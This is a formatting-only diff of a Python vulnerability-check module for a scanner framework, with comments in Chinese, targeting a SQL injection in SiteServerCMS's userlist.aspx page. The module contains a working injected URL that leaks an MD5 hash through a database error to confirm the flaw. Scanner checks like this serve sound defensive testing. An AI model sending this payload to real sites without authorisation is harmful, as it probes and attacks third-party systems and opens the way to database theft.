@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'SiteServer_0001' # 平台漏洞编号，留空
+    vuln_id = 'SiteServer_0001'  # 平台漏洞编号，留空
     name = 'SiteServerCMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         Siteserver /livefiles/pages/inner/userlist.aspx SQL Injection。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'SiteServer'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '440cfdc8-64e6-49ba-8494-b8ee9c70cad2'
@@ -31,11 +33,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&RelatedUserType=Friends&UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&userName=1%27and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            
+
             if req.status_code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
